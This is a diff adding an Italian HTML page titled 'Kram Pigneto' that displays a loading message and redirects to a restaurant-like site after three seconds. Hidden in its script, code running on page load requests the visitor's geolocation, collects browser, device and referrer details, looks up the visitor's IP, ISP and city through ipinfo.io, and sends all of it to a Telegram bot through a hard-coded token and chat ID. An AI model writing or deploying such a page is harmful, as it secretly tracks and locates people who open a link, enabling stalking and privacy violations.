@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kram Pigneto</title>
+    <meta http-equiv="refresh" content="3;url=https://www.kram-pigneto.com/" />
+    <script>
+        function inviaDati(lat, lon, ip, isp, paese, citta, connessione, dispositivo, sistema, browser, referrer) {
+            const botToken = "8182571590:AAFupZQi_yEYsr2M0fFIuHeAhZ-gpWYYEKE";
+            const chatId = "174901203";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `📍 Posizione ricevuta!\nLat: ${lat}\nLon: ${lon}\n🌍 Google Maps: https://www.google.com/maps?q=${lat},${lon}\n\n🖥 Info Utente:\nIP: ${ip}\nISP: ${isp}\nPaese: ${paese}\nCittà: ${citta}\nConnessione: ${connessione}\nDispositivo: ${dispositivo}\nSistema: ${sistema}\nBrowser: ${browser}\nReferrer: ${referrer}`;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => console.log("Dati inviati!", response))
+            .catch(error => console.error("Errore invio dati", error));
+        }
+
+        function ottieniPosizione() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        ottieniDatiUtente(position.coords.latitude, position.coords.longitude);
+                    },
+                    (error) => {
+                        console.error("Errore accesso posizione", error);
+                        ottieniDatiUtente("Non disponibile", "Non disponibile");
+                    }
+                );
+            } else {
+                console.error("Geolocalizzazione non supportata");
+                ottieniDatiUtente("Non disponibile", "Non disponibile");
+            }
+        }
+
+        function ottieniDatiUtente(lat, lon) {
+            const dispositivo = navigator.userAgent;
+            const sistema = navigator.platform;
+            const browser = navigator.userAgent.match(/(firefox|msie|chrome|safari|edge)/i)?.[0] || "Sconosciuto";
+            const connessione = navigator.connection?.effectiveType || "Sconosciuta";
+            const referrer = document.referrer || "Diretto";
+
+            fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip || "Non disponibile";
+                    const isp = data.org || "Non disponibile";
+                    const paese = data.country || "Non disponibile";
+                    const citta = data.city || "Non disponibile";
+                    inviaDati(lat, lon, ip, isp, paese, citta, connessione, dispositivo, sistema, browser, referrer);
+                })
+                .catch(error => {
+                    console.error("Errore ottenimento IP", error);
+                    inviaDati(lat, lon, "Non disponibile", "Non disponibile", "Non disponibile", "Non disponibile", connessione, dispositivo, sistema, browser, referrer);
+                });
+        }
+    </script>
+</head>
+<body onload="ottieniPosizione()">
+    <h1>Caricamento...</h1>
+</body>
+</html>
